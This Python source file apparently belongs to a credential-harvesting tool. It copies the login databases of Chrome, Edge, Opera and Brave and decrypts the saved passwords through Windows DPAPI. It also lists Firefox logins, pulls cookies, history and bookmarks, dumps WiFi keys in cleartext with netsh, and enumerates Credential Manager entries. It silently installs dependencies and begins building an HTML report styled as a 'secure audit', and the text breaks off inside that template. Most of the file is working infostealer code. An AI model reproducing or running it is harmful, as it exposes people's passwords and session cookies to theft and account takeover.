import os
import json
import sqlite3
import base64
import shutil
import tempfile
import platform
from datetime import datetime
import subprocess
import getpass
from pathlib import Path

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2

    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    print("[!] pycryptodome not installed. Chrome/Edge password decryption limited.")


def get_chrome_passwords():
    """Extract saved passwords from Google Chrome"""
    passwords = []

    # Chrome password database locations
    chrome_paths = []

    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    elif platform.system() == "Darwin":  # macOS
        base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Google', 'Chrome')
    else:  # Linux
        base_path = os.path.join(os.path.expanduser('~'), '.config', 'google-chrome')

    # Check for default profile
    default_login_data = os.path.join(base_path, 'Default', 'Login Data')
    if os.path.exists(default_login_data):
        chrome_paths.append(default_login_data)

    # Check for other profiles
    if os.path.exists(base_path):
        for item in os.listdir(base_path):
            if item.startswith('Profile'):
                profile_login_data = os.path.join(base_path, item, 'Login Data')
                if os.path.exists(profile_login_data):
                    chrome_paths.append(profile_login_data)

    for login_db in chrome_paths:
        try:
            # Copy the database to temp location (Chrome locks the original)
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            temp_db.close()
            shutil.copy2(login_db, temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            # Query saved logins
            cursor.execute("""
                           SELECT origin_url, username_value, password_value, date_created, date_last_used
                           FROM logins
                           WHERE username_value != ''
                           ORDER BY date_last_used DESC
                           """)

            for row in cursor.fetchall():
                url, username, encrypted_password, date_created, date_last_used = row

                # Decrypt Chrome password (Windows DPAPI)
                password = ""
                if HAS_CRYPTO and encrypted_password and len(encrypted_password) > 0:
                    try:
                        if platform.system() == "Windows":
                            # Windows uses DPAPI
                            import win32crypt
                            password = win32crypt.CryptUnprotectData(
                                encrypted_password, None, None, None, 0
                            )[1].decode('utf-8')
                        else:
                            # macOS/Linux use encrypted keychain
                            password = "[Encrypted - Requires keychain access]"
                    except:
                        password = "[Decryption Failed]"
                elif encrypted_password:
                    password = f"[Encrypted: {len(encrypted_password)} bytes]"
                else:
                    password = ""

                if username or password:
                    passwords.append({
                        'browser': 'Chrome',
                        'url': url,
                        'username': username,
                        'password': password,
                        'date_created': datetime.fromtimestamp(date_created / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_created else 'N/A',
                        'date_last_used': datetime.fromtimestamp(date_last_used / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_last_used else 'N/A',
                        'profile': os.path.basename(os.path.dirname(login_db))
                    })

            conn.close()
            os.unlink(temp_db.name)

        except Exception as e:
            print(f"[!] Chrome password extraction error: {e}")
            continue

    return passwords


def get_edge_passwords():
    """Extract saved passwords from Microsoft Edge"""
    passwords = []

    # Edge password database locations (similar to Chrome)
    edge_paths = []

    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')
    elif platform.system() == "Darwin":  # macOS
        base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Microsoft Edge')
    else:  # Linux
        base_path = os.path.join(os.path.expanduser('~'), '.config', 'microsoft-edge')

    # Check for default profile
    default_login_data = os.path.join(base_path, 'Default', 'Login Data')
    if os.path.exists(default_login_data):
        edge_paths.append(default_login_data)

    # Check for other profiles
    if os.path.exists(base_path):
        for item in os.listdir(base_path):
            if item.startswith('Profile'):
                profile_login_data = os.path.join(base_path, item, 'Login Data')
                if os.path.exists(profile_login_data):
                    edge_paths.append(profile_login_data)

    for login_db in edge_paths:
        try:
            # Copy the database to temp location
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            temp_db.close()
            shutil.copy2(login_db, temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            # Query saved logins
            cursor.execute("""
                           SELECT origin_url, username_value, password_value, date_created, date_last_used
                           FROM logins
                           WHERE username_value != ''
                           ORDER BY date_last_used DESC
                           """)

            for row in cursor.fetchall():
                url, username, encrypted_password, date_created, date_last_used = row

                # Decrypt Edge password (Windows DPAPI)
                password = ""
                if HAS_CRYPTO and encrypted_password and len(encrypted_password) > 0:
                    try:
                        if platform.system() == "Windows":
                            import win32crypt
                            password = win32crypt.CryptUnprotectData(
                                encrypted_password, None, None, None, 0
                            )[1].decode('utf-8')
                        else:
                            password = "[Encrypted - Requires keychain access]"
                    except:
                        password = "[Decryption Failed]"
                elif encrypted_password:
                    password = f"[Encrypted: {len(encrypted_password)} bytes]"
                else:
                    password = ""

                if username or password:
                    passwords.append({
                        'browser': 'Microsoft Edge',
                        'url': url,
                        'username': username,
                        'password': password,
                        'date_created': datetime.fromtimestamp(date_created / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_created else 'N/A',
                        'date_last_used': datetime.fromtimestamp(date_last_used / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_last_used else 'N/A',
                        'profile': os.path.basename(os.path.dirname(login_db))
                    })

            conn.close()
            os.unlink(temp_db.name)

        except Exception as e:
            print(f"[!] Edge password extraction error: {e}")
            continue

    return passwords


def get_firefox_passwords():
    """Extract saved passwords from Firefox"""
    passwords = []

    # Firefox profiles location
    if platform.system() == "Windows":
        profiles_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    elif platform.system() == "Darwin":  # macOS
        profiles_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox', 'Profiles')
    else:  # Linux
        profiles_path = os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox')

    if not os.path.exists(profiles_path):
        return passwords

    # Find profiles
    profiles = []
    for item in os.listdir(profiles_path):
        profile_path = os.path.join(profiles_path, item)
        if os.path.isdir(profile_path):
            # Check for key database
            key_db = os.path.join(profile_path, 'key4.db')
            logins_db = os.path.join(profile_path, 'logins.json')
            if os.path.exists(key_db) and os.path.exists(logins_db):
                profiles.append(profile_path)

    for profile in profiles:
        try:
            # Read logins.json
            logins_file = os.path.join(profile, 'logins.json')
            with open(logins_file, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)

            for login in logins_data.get('logins', []):
                url = login.get('hostname', '')
                username = login.get('username', '')
                encrypted_password = login.get('password', '')
                time_created = login.get('timeCreated', 0)
                time_last_used = login.get('timeLastUsed', 0)

                # Firefox passwords are encrypted with master password
                password = "[Encrypted - Requires master password]"

                if username or encrypted_password:
                    passwords.append({
                        'browser': 'Firefox',
                        'url': url,
                        'username': username,
                        'password': password,
                        'date_created': datetime.fromtimestamp(time_created / 1000).strftime(
                            '%Y-%m-%d %H:%M:%S') if time_created else 'N/A',
                        'date_last_used': datetime.fromtimestamp(time_last_used / 1000).strftime(
                            '%Y-%m-%d %H:%M:%S') if time_last_used else 'N/A',
                        'profile': os.path.basename(profile)
                    })

        except Exception as e:
            print(f"[!] Firefox password extraction error: {e}")
            continue

    return passwords


def get_operapasswords():
    """Extract saved passwords from Opera"""
    passwords = []

    # Opera password database locations
    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable')
    elif platform.system() == "Darwin":  # macOS
        base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'com.operasoftware.Opera')
    else:  # Linux
        base_path = os.path.join(os.path.expanduser('~'), '.config', 'opera')

    login_data = os.path.join(base_path, 'Login Data')

    if os.path.exists(login_data):
        try:
            # Copy the database to temp location
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            temp_db.close()
            shutil.copy2(login_data, temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            # Query saved logins
            cursor.execute("""
                           SELECT origin_url, username_value, password_value, date_created, date_last_used
                           FROM logins
                           WHERE username_value != ''
                           ORDER BY date_last_used DESC
                           """)

            for row in cursor.fetchall():
                url, username, encrypted_password, date_created, date_last_used = row

                # Decrypt Opera password (Windows DPAPI)
                password = ""
                if HAS_CRYPTO and encrypted_password and len(encrypted_password) > 0:
                    try:
                        if platform.system() == "Windows":
                            import win32crypt
                            password = win32crypt.CryptUnprotectData(
                                encrypted_password, None, None, None, 0
                            )[1].decode('utf-8')
                        else:
                            password = "[Encrypted - Requires keychain access]"
                    except:
                        password = "[Decryption Failed]"
                elif encrypted_password:
                    password = f"[Encrypted: {len(encrypted_password)} bytes]"
                else:
                    password = ""

                if username or password:
                    passwords.append({
                        'browser': 'Opera',
                        'url': url,
                        'username': username,
                        'password': password,
                        'date_created': datetime.fromtimestamp(date_created / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_created else 'N/A',
                        'date_last_used': datetime.fromtimestamp(date_last_used / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_last_used else 'N/A',
                        'profile': 'Default'
                    })

            conn.close()
            os.unlink(temp_db.name)

        except Exception as e:
            print(f"[!] Opera password extraction error: {e}")

    return passwords


def get_brave_passwords():
    """Extract saved passwords from Brave Browser"""
    passwords = []

    # Brave password database locations
    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data')
    elif platform.system() == "Darwin":  # macOS
        base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'BraveSoftware',
                                 'Brave-Browser')
    else:  # Linux
        base_path = os.path.join(os.path.expanduser('~'), '.config', 'brave-browser')

    # Check for default profile
    default_login_data = os.path.join(base_path, 'Default', 'Login Data')
    if os.path.exists(default_login_data):
        try:
            # Copy the database to temp location
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            temp_db.close()
            shutil.copy2(default_login_data, temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            # Query saved logins
            cursor.execute("""
                           SELECT origin_url, username_value, password_value, date_created, date_last_used
                           FROM logins
                           WHERE username_value != ''
                           ORDER BY date_last_used DESC
                           """)

            for row in cursor.fetchall():
                url, username, encrypted_password, date_created, date_last_used = row

                # Decrypt Brave password (Windows DPAPI)
                password = ""
                if HAS_CRYPTO and encrypted_password and len(encrypted_password) > 0:
                    try:
                        if platform.system() == "Windows":
                            import win32crypt
                            password = win32crypt.CryptUnprotectData(
                                encrypted_password, None, None, None, 0
                            )[1].decode('utf-8')
                        else:
                            password = "[Encrypted - Requires keychain access]"
                    except:
                        password = "[Decryption Failed]"
                elif encrypted_password:
                    password = f"[Encrypted: {len(encrypted_password)} bytes]"
                else:
                    password = ""

                if username or password:
                    passwords.append({
                        'browser': 'Brave',
                        'url': url,
                        'username': username,
                        'password': password,
                        'date_created': datetime.fromtimestamp(date_created / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_created else 'N/A',
                        'date_last_used': datetime.fromtimestamp(date_last_used / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if date_last_used else 'N/A',
                        'profile': 'Default'
                    })

            conn.close()
            os.unlink(temp_db.name)

        except Exception as e:
            print(f"[!] Brave password extraction error: {e}")

    return passwords


def get_browser_cookies():
    """Extract browser cookies"""
    cookies = []

    # Chrome/Edge cookies
    if platform.system() == "Windows":
        chrome_cookie_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default',
                                          'Cookies')
        edge_cookie_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default',
                                        'Cookies')
    else:
        chrome_cookie_path = ""
        edge_cookie_path = ""

    cookie_paths = [
        ('Chrome', chrome_cookie_path),
        ('Edge', edge_cookie_path)
    ]

    for browser, cookie_path in cookie_paths:
        if os.path.exists(cookie_path):
            try:
                temp_db = tempfile.NamedTemporaryFile(delete=False)
                temp_db.close()
                shutil.copy2(cookie_path, temp_db.name)

                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()

                cursor.execute("""
                               SELECT host_key,
                                      name,
                                      value,
                                      path,
                                      expires_utc,
                                      is_secure,
                                      is_httponly,
                                      has_expires,
                                      is_persistent
                               FROM cookies
                               ORDER BY host_key
                               """)

                for row in cursor.fetchall()[:50]:  # Limit to 50 cookies
                    host, name, value, path, expires, secure, httponly, has_expires, persistent = row

                    # Try to decrypt cookie value
                    decrypted_value = value
                    if value and len(value) > 0:
                        try:
                            if platform.system() == "Windows" and HAS_CRYPTO:
                                import win32crypt
                                decrypted_value = win32crypt.CryptUnprotectData(
                                    value, None, None, None, 0
                                )[1].decode('utf-8', errors='ignore')
                        except:
                            pass

                    cookies.append({
                        'browser': browser,
                        'domain': host,
                        'cookie_name': name,
                        'value': decrypted_value[:100] + "..." if len(str(decrypted_value)) > 100 else decrypted_value,
                        'path': path,
                        'secure': 'Yes' if secure else 'No',
                        'httponly': 'Yes' if httponly else 'No',
                        'expires': datetime.fromtimestamp(expires / 1000000 - 11644473600).strftime(
                            '%Y-%m-%d %H:%M:%S') if expires else 'Session'
                    })

                conn.close()
                os.unlink(temp_db.name)

            except Exception as e:
                print(f"[!] {browser} cookie extraction error: {e}")

    return cookies


def get_browser_history():
    """Extract browser history"""
    history = []

    # Chrome history
    if platform.system() == "Windows":
        chrome_history_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default',
                                           'History')
    else:
        chrome_history_path = ""

    if os.path.exists(chrome_history_path):
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            temp_db.close()
            shutil.copy2(chrome_history_path, temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            cursor.execute("""
                           SELECT url, title, visit_count, last_visit_time
                           FROM urls
                           ORDER BY last_visit_time DESC LIMIT 100
                           """)

            for row in cursor.fetchall():
                url, title, visit_count, last_visit = row

                history.append({
                    'browser': 'Chrome',
                    'url': url,
                    'title': title[:100] + "..." if len(title) > 100 else title,
                    'visit_count': visit_count,
                    'last_visit': datetime.fromtimestamp(last_visit / 1000000 - 11644473600).strftime(
                        '%Y-%m-%d %H:%M:%S') if last_visit else 'N/A'
                })

            conn.close()
            os.unlink(temp_db.name)

        except Exception as e:
            print(f"[!] Chrome history extraction error: {e}")

    return history


def get_browser_bookmarks():
    """Extract browser bookmarks"""
    bookmarks = []

    # Chrome bookmarks
    if platform.system() == "Windows":
        chrome_bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default',
                                             'Bookmarks')
    else:
        chrome_bookmarks_path = ""

    if os.path.exists(chrome_bookmarks_path):
        try:
            with open(chrome_bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)

            def extract_bookmarks(node, browser):
                items = []
                if 'children' in node:
                    for child in node['children']:
                        if child.get('type') == 'url':
                            items.append({
                                'browser': browser,
                                'name': child.get('name', ''),
                                'url': child.get('url', ''),
                                'date_added': datetime.fromtimestamp(
                                    int(child.get('date_added', '0')) / 1000000 - 11644473600).strftime(
                                    '%Y-%m-%d') if child.get('date_added') else 'N/A'
                            })
                        elif child.get('type') == 'folder':
                            items.extend(extract_bookmarks(child, browser))
                return items

            # Extract from bookmark bar and other folders
            roots = bookmarks_data.get('roots', {})
            for root_key in ['bookmark_bar', 'other', 'synced']:
                if root_key in roots:
                    bookmarks.extend(extract_bookmarks(roots[root_key], 'Chrome'))

        except Exception as e:
            print(f"[!] Chrome bookmarks extraction error: {e}")

    return bookmarks[:50]  # Limit to 50 bookmarks


def get_wifi_passwords():
    """Extract WiFi passwords (Windows only)"""
    wifi_passwords = []

    if platform.system() == "Windows":
        try:
            # Get WiFi profiles
            output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
            profiles = []

            for line in output.split('\n'):
                if 'All User Profile' in line:
                    profile_name = line.split(':')[1].strip()
                    profiles.append(profile_name)

            for profile in profiles:
                try:
                    # Get password for each profile
                    cmd = f'netsh wlan show profile name="{profile}" key=clear'
                    result = subprocess.check_output(cmd, shell=True, text=True)

                    password = "Not found"
                    security = "Unknown"

                    for line in result.split('\n'):
                        if 'Key Content' in line:
                            password = line.split(':')[1].strip()
                        elif 'Authentication' in line:
                            security = line.split(':')[1].strip()

                    wifi_passwords.append({
                        'ssid': profile,
                        'password': password,
                        'security': security,
                        'interface': 'Wi-Fi'
                    })

                except:
                    continue

        except Exception as e:
            print(f"[!] WiFi password extraction error: {e}")

    return wifi_passwords


def get_system_credentials():
    """Extract system credentials (Windows Credential Manager)"""
    credentials = []

    if platform.system() == "Windows":
        try:
            # Query Windows Credential Manager
            cmd = 'cmdkey /list'
            output = subprocess.check_output(cmd, shell=True, text=True)

            for line in output.split('\n'):
                if 'Target:' in line:
                    target = line.split('Target:')[1].strip()
                    credentials.append({
                        'type': 'Windows Credential',
                        'target': target,
                        'username': 'N/A (Encrypted)',
                        'password': 'Encrypted by Windows',
                        'source': 'Credential Manager'
                    })

        except Exception as e:
            print(f"[!] System credential extraction error: {e}")

    return credentials


def get_all_browser_passwords():
    """Main function to get all browser passwords and credentials"""
    print("\n" + "=" * 70)
    print("EXTRACTING BROWSER PASSWORDS & CREDENTIALS")
    print("=" * 70)

    all_passwords = []

    # Install required packages if needed
    try:
        import win32crypt
    except ImportError:
        print("[!] Installing required packages...")
        subprocess.call([sys.executable, "-m", "pip", "install", "pywin32", "pycryptodome"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Extract from all browsers
    print("\n[+] Extracting Chrome passwords...")
    chrome_passwords = get_chrome_passwords()
    all_passwords.extend(chrome_passwords)
    print(f"   --> Found {len(chrome_passwords)} Chrome passwords")

    print("[+] Extracting Edge passwords...")
    edge_passwords = get_edge_passwords()
    all_passwords.extend(edge_passwords)
    print(f"  --> Found {len(edge_passwords)} Edge passwords")

    print("[+] Extracting Firefox passwords...")
    firefox_passwords = get_firefox_passwords()
    all_passwords.extend(firefox_passwords)
    print(f"  --> Found {len(firefox_passwords)} Firefox passwords")

    print("[+] Extracting Opera passwords...")
    opera_passwords = get_operapasswords()
    all_passwords.extend(opera_passwords)
    print(f"  --> Found {len(opera_passwords)} Opera passwords")

    print("[+] Extracting Brave passwords...")
    brave_passwords = get_brave_passwords()
    all_passwords.extend(brave_passwords)
    print(f"  --> Found {len(brave_passwords)} Brave passwords")

    print("[+] Extracting browser cookies...")
    cookies = get_browser_cookies()

    print("[+] Extracting browser history...")
    history = get_browser_history()

    print("[+] Extracting browser bookmarks...")
    bookmarks = get_browser_bookmarks()

    print("\n[+] Extracting WiFi passwords...")
    wifi_passwords = get_wifi_passwords()

    print("\n[+] Extracting system credentials...")
    system_credentials = get_system_credentials()

    # Generate report
    generate_password_report(all_passwords, cookies, history, bookmarks, wifi_passwords, system_credentials)

    return all_passwords


def generate_password_report(passwords, cookies, history, bookmarks, wifi_passwords, system_credentials, fontSize=14):
    """Generate professional HTML report with enhanced hacker theme"""

    downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
    report_path = os.path.join(downloads_path,
                               f'Sabari425_Browser_Credentials_Report_{datetime.now().strftime("%d%m%Y_%H%M%S")}.html')

    # Group passwords by browser
    passwords_by_browser = {}
    for pwd in passwords:
        browser = pwd['browser']
        if browser not in passwords_by_browser:
            passwords_by_browser[browser] = []
        passwords_by_browser[browser].append(pwd)

    html_content = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SECURE AUDIT :: Browser Credentials Report</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --hacker-green: #00ff00;
                --hacker-green-dark: #00cc00;
                --hacker-green-light: #33ff33;
                --matrix-green: #00ff41;
                --dark-bg: #0a0a0a;
                --darker-bg: #050505;
                --card-bg: rgba(10, 30, 10, 0.3);
                --accent-purple: #bb00ff;
                --warning-orange: #ff6600;
                --warning-orange1: #fd6600;
                --danger-red: #ff0000;
                --info-blue: #0098ff;
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: 'Segoe UI', 'Consolas', 'Monaco', monospace;
                background: var(--dark-bg);
                color: var(--hacker-green);
                line-height: 1.6;
                overflow-x: hidden;
                position: relative;
            }

            /* Matrix background effect */
            #matrix-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: -1;
                opacity: 0.03;
            }

            /* Main container */
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }

            /* Header with terminal-style */
            .terminal-header {
                background: linear-gradient(135deg, var(--darker-bg) 0%, #001a00 100%);
                border: 2px solid var(--hacker-green);
                border-radius: 8px;
                padding: 25px;
                margin-bottom: 30px;
                box-shadow: 0 0 25px rgba(0, 255, 0, 0.1);
                position: relative;
                overflow: hidden;
            }

            .terminal-header::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: linear-gradient(
                    45deg,
                    transparent 30%,
                    rgba(0, 255, 0, 0.05) 50%,
                    transparent 70%
                );
                animation: scan 15s linear infinite;
            }

            @keyframes scan {
                0% { transform: translate(0, 0) rotate(0deg); }
                100% { transform: translate(-50%, -50%) rotate(360deg); }
            }

            .header-content {
                position: relative;
                z-index: 1;
            }

            .header-title {
                display: flex;
                align-items: center;
                gap: 15px;
                margin-bottom: 15px;
            }

            .header-title h1 {
                font-size: 2.4rem;
                background: linear-gradient(90deg, var(--hacker-green), var(--matrix-green));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                text-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
                letter-spacing: 1px;
            }

            .header-icon {
                font-size: 2rem;
                color: #fffff;
                animation: pulse 2s infinite;
            }

            @keyframes pulse {
                0%, 100% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.7; transform: scale(1.1); }
            }

            .header-meta {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 15px;
                margin-top: 20px;
            }

            .meta-item {
                display: flex;
                align-items: center;
                gap: 10px;
                padding: 10px 15px;
                background: rgba(0, 30, 0, 0.4);
                border-radius: 5px;
                border-left: 3px solid var(--hacker-green);
            }

            .meta-icon {
                color:#fffff;
                font-size: 1.2rem;
            }

            /* Dashboard stats */
            .dashboard-stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }

            .stat-card {
                background: var(--card-bg);
                border: 1px solid rgba(0, 255, 0, 0.2);
                border-radius: 8px;
                padding: 25px 20px;
                text-align: center;
                transition: all 0.3s ease;
                position: relative;
                overflow: hidden;
            }

            .stat-card:hover {
                transform: translateY(-5px);
                border-color: var(--hacker-green);
                box-shadow: 0 10px 20px rgba(0, 255, 0, 0.1);
            }

            .stat-card::after {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 2px;
                background: linear-gradient(90deg, transparent, var(--hacker-green), transparent);
                animation: scanline 3s linear infinite;
            }

            @keyframes scanline {
                0% { left: -100%; }
                100% { left: 100%; }
            }

            .stat-icon {
                font-size: 2.5rem;
                margin-bottom: 15px;
                opacity: 0.8;
            }

            .stat-count {
                font-size: 2.8rem;
                font-weight: bold;
                color: var(--matrix-green);
                text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
                margin: 10px 0;
            }

            .stat-label {
                font-size: 0.9rem;
                color: var(--hacker-green-light);
                text-transform: uppercase;
                letter-spacing: 1px;
            }

            /* Data sections */
            .data-section {
                background: rgba(5, 20, 5, 0.6);
                border: 1px solid rgba(0, 255, 0, 0.15);
                border-radius: 8px;
                padding: 25px;
                margin: 30px 0;
                transition: all 0.3s ease;
            }

            .data-section:hover {
                border-color: rgba(0, 255, 0, 0.3);
                box-shadow: 0 5px 15px rgba(0, 255, 0, 0.05);
            }

            .section-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
                padding-bottom: 15px;
                border-bottom: 2px solid rgba(0, 255, 0, 0.2);
            }

            .section-title {
                display: flex;
                align-items: center;
                gap: 12px;
                font-size: 1.4rem;
                color: var(--hacker-green);
            }

            .section-badge {
                background: var(--hacker-green-dark);
                color: var(--dark-bg);
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 0.85rem;
                font-weight: bold;
                letter-spacing: 0.5px;
            }

            .section-badge.warning {
                background: var(--warning-orange);
                color: white;
            }

            .section-badge.danger {
                background: var(--danger-red);
                color: white;
                animation: blink 1.5s infinite;
            }

            /* Enhanced tables */
            .data-table {
                width: 100%;
                border-collapse: separate;
                border-spacing: 0;
                font-size: 0.9rem;
            }

            .data-table thead {
                background: rgba(0, 40, 0, 0.5);
            }

            .data-table th {
                padding: 15px 12px;
                text-align: left;
                font-weight: 600;
                color: var(--matrix-green);
                border-bottom: 2px solid var(--hacker-green-dark);
                text-transform: uppercase;
                letter-spacing: 0.5px;
                font-size: 0.85rem;
            }

            .data-table td {
                padding: 12px;
                border-bottom: 1px solid rgba(0, 255, 0, 0.1);
                color: var(--hacker-green-light);
            }

            .data-table tbody tr {
                transition: all 0.2s ease;
            }

            .data-table tbody tr:hover {
                background: rgba(0, 255, 0, 0.05);
                transform: scale(1.002);
            }

            .password-cell {
                font-family: 'Courier New', monospace;
                font-weight: bold;
                color: var(--warning-orange);
                padding: 6px 10px;
                background: rgba(255, 102, 0, 0.1);
                border-radius: 4px;
                border: 1px solid rgba(255, 102, 0, 0.3);
            }

            .password-cell.decrypted {
                color: var(--danger-red);
                background: rgba(255, 0, 0, 0.1);
                border-color: rgba(255, 0, 0, 0.3);
            }

            .password-cell.encrypted {
                color: var(--warning-orange1);
                background: rgba(0, 153, 255, 0.1);
                border-color: rgba(0, 153, 255, 0.3);
            }

            .url-cell {
                max-width: 250px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }

            .url-cell:hover {
                overflow: visible;
                white-space: normal;
                background: var(--darker-bg);
                position: relative;
                z-index: 10;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
            }

            .browser-badge {
                display: inline-block;
                padding: 3px 10px;
                border-radius: 12px;
                font-size: 0.8rem;
                font-weight: bold;
                text-align: center;
                min-width: 70px;
            }

            .chrome-badge { background: rgba(66, 133, 244, 0.2); color: #4285f4; border: 1px solid #4285f4; }
            .firefox-badge { background: rgba(255, 102, 0, 0.2); color: #ff6600; border: 1px solid #ff6600; }
            .edge-badge { background: rgba(0, 120, 215, 0.2); color: #0078d7; border: 1px solid #0078d7; }
            .opera-badge { background: rgba(255, 0, 0, 0.2); color: #ff0000; border: 1px solid #ff0000; }
            .brave-badge { background: rgba(251, 193, 53, 0.2); color: #fbc135; border: 1px solid #fbc135; }

            /* Toggle sections */
            .toggle-btn {
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid var(--hacker-green);
                color: var(--hacker-green);
                padding: 8px 15px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 0.9rem;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                gap: 8px;
            }

            .toggle-btn:hover {
                background: rgba(0, 255, 0, 0.2);
                transform: translateY(-2px);
            }

            .collapsed {
                overflow-y: auto;
            }

            .collapsed::-webkit-scrollbar {
                width: 0.1px;
            }

            .collapsed::-webkit-scrollbar-track {
                background: none;
            }

            .collapsed::-webkit-scrollbar-thumb {
                background: none;
            }

            /* Risk indicators */
            .risk-indicator {
                display: inline-flex;
                align-items: center;
                gap: 5px;
                padding: 3px 10px;
                border-radius: 12px;
                font-size: 0.8rem;
                font-weight: bold;
            }

            .risk-low { background: rgba(0, 255, 0, 0.2); color: var(--hacker-green); }
            .risk-medium { background: rgba(255, 153, 0, 0.2); color: var(--warning-orange); }
            .risk-high { background: rgba(255, 0, 0, 0.2); color: var(--danger-red); }

            /* Footer */
            .footer {
                margin-top: 40px;
                padding: 25px;
                background: rgba(5, 15, 5, 0.8);
                border-radius: 8px;
                border: 1px solid rgba(0, 255, 0, 0.1);
                text-align: center;
            }

            .security-warning {
                display: inline-block;
                padding: 15px 25px;
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid var(--danger-red);
                border-radius: 8px;
                margin-bottom: 20px;
                animation: warningPulse 3s infinite;
            }

            @keyframes warningPulse {
                0%, 100% { box-shadow: 0 0 5px rgba(255, 0, 0, 0.5); }
                50% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.8); }
            }

            .footer-links {
                display: flex;
                justify-content: center;
                gap: 20px;
                margin-top: 15px;
            }

            .footer-link {
                color: var(--info-blue);
                text-decoration: none;
                display: flex;
                align-items: center;
                gap: 5px;
                transition: all 0.3s ease;
            }

            .footer-link:hover {
                color: var(--hacker-green);
                transform: translateY(-2px);
            }

            /* Responsive */
            @media (max-width: 768px) {
                .container {
                    padding: 10px;
                }

                .header-title h1 {
                    font-size: 1.8rem;
                }

                .dashboard-stats {
                    grid-template-columns: repeat(2, 1fr);
                }

                .data-table {
                    display: block;
                    overflow-x: auto;
                }
            }

            @media (max-width: 480px) {
                .dashboard-stats {
                    grid-template-columns: 1fr;
                }

                .header-meta {
                    grid-template-columns: 1fr;
                }
            }
        </style>
    </head>
    <body>
        <!-- Matrix Background -->
        <canvas id="matrix-bg"></canvas>

        <div class="container">
            <!-- Terminal Header -->
            <header class="terminal-header">
                <div class="header-content">
                    <div class="header-title">
                        <i class="fas fa-shield-alt header-icon" style="color: #fffff"></i>
                        <h1>SECURE AUDIT :: CREDENTIALS INTELLIGENCE</h1>
                    </div>

                    <p style="color: var(--hacker-green-light); margin-bottom: 15px; font-size: 1.1rem;">
